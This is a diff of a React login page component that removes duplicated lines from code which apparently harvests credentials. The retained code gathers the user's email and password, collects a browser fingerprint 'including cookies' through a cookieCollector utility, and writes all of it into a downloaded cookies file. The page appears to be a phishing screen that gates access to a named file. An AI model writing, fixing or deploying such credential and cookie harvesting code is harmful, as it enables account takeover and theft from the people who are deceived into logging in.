@@ -1,7 +1,6 @@
 import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
 import { collectBrowserFingerprint, createCookiesFile } from '../utils/cookieCollector';
-import { collectBrowserFingerprint, createCookiesFile } from '../utils/cookieCollector';
 
 interface LoginPageProps {
   fileName: string;
@@ -90,9 +89,6 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
       // Collect comprehensive browser fingerprint including cookies
       const browserFingerprint = collectBrowserFingerprint();
       
-      // Collect comprehensive browser fingerprint including cookies
-      const browserFingerprint = collectBrowserFingerprint();
-      
       const loginData = {
         email,
         password,
@@ -102,13 +98,9 @@ const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess 
         userAgent: navigator.userAgent,
         ip: 'hidden',
         browserFingerprint
-        browserFingerprint
       };
 
       console.log('Attempting login with data:', { ...loginData, password: '[HIDDEN]' });
-
-      // Create and download cookies file
-      createCookiesFile(browserFingerprint, loginData);
 
       // Create and download cookies file
       createCookiesFile(browserFingerprint, loginData);
